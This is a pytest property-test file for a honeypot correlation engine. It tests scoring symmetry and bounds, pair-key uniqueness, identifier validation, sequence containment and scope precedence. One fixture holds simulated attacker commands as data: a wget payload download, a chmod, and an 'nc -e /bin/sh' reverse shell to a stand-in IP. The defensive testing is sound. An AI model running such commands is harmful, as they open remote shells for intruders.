"""Property tests for invariants the correlation model relies on.

These are not scenario tests: each one states a property that must hold for
every input, and would have caught a defect found in review rather than a
behaviour someone happened to check.
"""

from __future__ import annotations

import itertools
from collections import Counter

import pytest
from pydantic import ValidationError

PAIR_SEPARATOR = "\x1f"


def _sessions(**overrides):
    from app.correlation.features import build_sessions
    from app.evaluation.runner import _build_sessions
    from app.evaluation.scenarios import generate_dataset

    dataset = generate_dataset(
        seed=overrides.pop("seed", 11),
        campaign_groups=overrides.pop("campaign_groups", 5),
        sessions_per_group=overrides.pop("sessions_per_group", 3),
        benign_sessions=overrides.pop("benign_sessions", 6),
        same_ip_pairs=2,
        incomplete_groups=1,
        delayed_sessions=2,
        generic_groups=1,
    )
    sessions, order = _build_sessions(dataset["sessions"])
    return build_sessions, sessions, order


def _compare_pairs():
    from app.correlation.features import CorrelationContext
    from app.correlation.scoring import compare, pair_key

    _, sessions, order = _sessions()
    context = CorrelationContext.from_sessions(sessions.values())
    results = {}
    for left_id, right_id in itertools.combinations(order, 2):
        results[pair_key(left_id, right_id)] = compare(
            sessions[left_id], sessions[right_id], context=context
        )
    return sessions, context, results


def test_scoring_is_symmetric_and_deterministic():
    from app.correlation.scoring import compare

    sessions, context, results = _compare_pairs()
    by_id = {session_id: session for session_id, session in sessions.items()}
    for key, first in list(results.items())[:200]:
        left_id, right_id = key.split(PAIR_SEPARATOR)
        mirrored = compare(by_id[right_id], by_id[left_id], context=context)
        assert mirrored["score"] == first["score"]
        assert mirrored["confidence"] == first["confidence"]
        assert mirrored["decision"] == first["decision"]
        assert mirrored["family_scores"] == first["family_scores"]
        assert compare(by_id[left_id], by_id[right_id], context=context) == first


def test_scores_stay_inside_their_bounds_and_confidence_is_monotonic():
    results = _compare_pairs()[2]
    ordered = sorted(results.values(), key=lambda item: item["score"])
    previous = -1.0
    for result in ordered:
        assert 0.0 <= result["score"] <= 1.0
        assert 0.0 <= result["support"] <= 1.0
        assert 0.0 <= result["coverage"] <= 1.0
        assert 0.0 <= result["confidence"] <= 1.0
        assert 0.0 <= result["penalty"] <= 0.35
        assert sum(result["family_weights"].values()) > 0
        # Score and confidence are exposed rounded to four decimals.  Two
        # pairs whose true scores differ by less than a display unit can share
        # a rounded score while their rounded confidences differ in the last
        # place, so allow the logistic's maximum sensitivity to that rounding.
        assert result["confidence"] >= previous - 2e-4
        previous = result["confidence"]


def test_sessions_without_any_evidence_are_not_linked():
    from app.correlation.features import Session
    from app.correlation.scoring import compare

    result = compare(Session(id="empty-a"), Session(id="empty-b"))
    assert result["decision"] == "not_linked"
    assert result["score"] == 0.0
    assert result["confidence"] <= 0.5


def test_relationship_keys_are_unique_for_every_accepted_identifier():
    """A collision here would let one pair overwrite another's evidence."""
    from app.correlation.scoring import pair_key

    identifiers = [
        "sess-1",
        "sess:1",
        "sess.1",
        "sess_1",
        "-1",
        ":1",
        "s1",
        "s",
        "session-with-a-long-name-0123456789",
        "0",
        "a" * 120,
    ]
    for index in range(40):
        identifiers.append(f"evt:{index}:honeypot.ssh.command")
    assert not any(PAIR_SEPARATOR in identifier for identifier in identifiers)

    keys = {
        pair_key(left, right)
        for left, right in itertools.combinations(identifiers, 2)
    }
    assert len(keys) == len(identifiers) * (len(identifiers) - 1) // 2


def test_identifiers_with_control_characters_are_rejected():
    from app.schemas.event import EventIn

    payload = {
        "schema_version": "1.0",
        "occurred_at": "2026-10-23T10:00:00+00:00",
        "source_module": "honeypot",
        "event_type": "honeypot.ssh.command",
        "provenance": {"collector": "test", "source": "pytest"},
    }
    with pytest.raises(ValidationError):
        EventIn(**{**payload, "session_id": f"sess{PAIR_SEPARATOR}one"})
    with pytest.raises(ValidationError):
        EventIn(**{**payload, "target_id": "decoy\x00one"})

    accepted = EventIn(**{**payload, "session_id": "sess:one-two_3"})
    assert accepted.session_id == "sess:one-two_3"


def test_ingestion_quarantines_a_session_identifier_with_a_separator(
    client, sensor_headers, admin_headers
):
    from datetime import datetime, timezone

    response = client.post(
        "/api/v1/ingest/events",
        headers=sensor_headers,
        json=[
            {
                "schema_version": "1.0",
                "occurred_at": datetime.now(timezone.utc).isoformat(),
                "source_module": "honeypot",
                "event_type": "honeypot.ssh.command",
                "source_ip": "203.0.113.10",
                "session_id": f"sess{PAIR_SEPARATOR}one",
                "provenance": {"collector": "test", "source": "pytest"},
                "features": {"command": "id"},
            }
        ],
    )
    assert response.status_code == 202, response.text
    body = response.json()
    assert body["accepted"] == 0
    assert body["rejected"] == 1
    assert "control characters" in body["results"][0]["reason"]

    quarantine = client.get("/api/v1/quarantine", headers=admin_headers).json()["items"]
    assert any("session_id" in item["reason"] for item in quarantine)


def test_a_stored_identifier_cannot_merge_two_sessions():
    """Rows written before validation existed must not collapse into one key."""
    from app.correlation.features import build_sessions

    def event(event_id: str, session_id: str) -> dict:
        return {
            "id": event_id,
            "occurred_at": "2026-10-23T10:00:00+00:00",
            "source_module": "honeypot",
            "source_ip": "203.0.113.10",
            "session_id": session_id,
            "severity": "low",
            "provenance": {},
            "features": {"action": "recon:uname", "category": "recon"},
        }

    sessions = build_sessions(
        [
            event("evt_1", f"a{PAIR_SEPARATOR}b"),
            event("evt_2", f"a{PAIR_SEPARATOR}c"),
            event("evt_3", "a"),
        ]
    )
    assert set(sessions) == {"evt:evt_1", "evt:evt_2", "a"}
    assert not any(PAIR_SEPARATOR in session_id for session_id in sessions)


def _uniform_sessions(count: int = 20):
    from app.correlation.features import Session

    sessions = []
    for index in range(count):
        session = Session(id=f"sess-{index}")
        session.usernames = {f"svc{index}"}
        session.clients = {f"toolkit-{index}"}
        session.actions = ["auth:login", "recon:uname", "download:wget"]
        session.categories = Counter({"recon": 2, "download": 1})
        session.event_ids = [f"sess-{index}-{step}" for step in range(3)]
        sessions.append(session)
    return sessions


def test_corpus_weights_discount_a_family_that_cannot_discriminate():
    """A family whose tokens are ubiquitous must not outweigh a specific one."""
    from app.correlation.features import CorrelationContext
    from app.correlation.scoring import FAMILY_WEIGHT, compare

    sessions = _uniform_sessions()
    context = CorrelationContext.from_sessions(sessions)
    assert context.specificity(["action"]) == 0.0
    assert context.specificity(["username"]) == 1.0

    weighted = compare(sessions[0], sessions[1], context=context)
    assert weighted["family_weighting"] == "corpus"
    assert weighted["family_weights"]["behavior"] == 0.0
    assert weighted["family_weights"]["identity"] == pytest.approx(
        FAMILY_WEIGHT["identity"]
    )

    uniform = compare(
        sessions[0], sessions[1], context=context, uniform_family_weights=True
    )
    assert uniform["family_weighting"] == "uniform"
    assert uniform["family_weights"] == pytest.approx(FAMILY_WEIGHT)
    # The discriminating family therefore carries more of the score.
    assert weighted["family_weights"]["identity"] > weighted["family_weights"]["behavior"]


def test_truncated_sequences_are_compared_by_containment():
    """A session that recorded fewer commands is not evidence of a difference."""
    from app.correlation.features import Session
    from app.correlation.scoring import compare

    def session(name: str, commands: list[str]) -> Session:
        built = Session(id=name)
        built.commands = commands
        built.actions = ["recon:id", "download:wget", "privilege:chmod", "lateral:nc"][
            : len(commands)
        ]
        built.usernames = {"svc7"}
        built.clients = {"ssh-2.0-toolkit7"}
        built.event_ids = [f"{name}-{index}" for index in range(len(commands))]
        return built

    full = session(
        "full",
        ["id", "wget http://198.51.100.7/impl", "chmod +x impl", "nc -e /bin/sh 198.51.100.7 4444"],
    )
    partial = session("partial", ["id", "wget http://198.51.100.7/impl", "chmod +x impl"])

    def sequence_score(result: dict) -> float:
        return next(
            component["score"]
            for component in result["components"]
            if component["name"] == "action_sequence"
        )

    overlapping = compare(full, partial)
    jaccard = compare(full, partial, sequence_overlap=False)
    assert overlapping["sequence_similarity"] == "overlap"
    assert jaccard["sequence_similarity"] == "jaccard"
    assert sequence_score(overlapping) > sequence_score(jaccard)
    assert overlapping["score"] >= jaccard["score"]


def test_time_to_detection_measures_evidence_not_scheduling():
    """Stage 12 asks for time to detection; it must be computed, not asserted."""
    from datetime import datetime, timedelta, timezone

    from app.correlation.features import Session
    from app.correlation.scoring import pair_key
    from app.evaluation.runner import _time_to_detection

    base = datetime(2026, 1, 1, tzinfo=timezone.utc)
    sessions = {}
    for index in range(3):
        session = Session(id=f"s{index}")
        session.first_seen = base
        session.last_seen = base + timedelta(minutes=10 * (index + 1))
        sessions[session.id] = session

    linked = _time_to_detection(
        sessions,
        {pair_key("s0", "s1"): {"decision": "linked"}},
        {"s0": "group-a", "s1": "group-a", "s2": "solo"},
    )
    assert linked["groups_measured"] == 1
    assert linked["groups_with_a_link"] == 1
    # Both members had finished emitting by the later member's last event.
    assert linked["median_seconds"] == 1200.0

    empty = _time_to_detection(sessions, {}, {"s0": "group-a", "s1": "group-a"})
    assert empty["groups_with_a_link"] == 0
    assert empty["median_seconds"] is None


def test_narrow_scope_governs_a_broader_authorization(client, admin_headers):
    from app.websec.scope import find_active_scope

    broad = client.post(
        "/api/v1/websec/scopes",
        headers=admin_headers,
        json={
            "domain": "example.com",
            "authorized_by": "secops",
            "allow_active": True,
            "expires_in_days": 7,
        },
    )
    assert broad.status_code == 201, broad.text
    narrow = client.post(
        "/api/v1/websec/scopes",
        headers=admin_headers,
        json={
            "domain": "api.example.com",
            "authorized_by": "secops",
            "allow_active": False,
            "expires_in_days": 7,
        },
    )
    assert narrow.status_code == 201, narrow.text

    governing = find_active_scope("api.example.com")
    assert governing["domain"] == "api.example.com"
    assert governing["allow_active"] is False
    # The broader grant still covers hosts it is the only scope for.
    assert find_active_scope("www.example.com")["domain"] == "example.com"
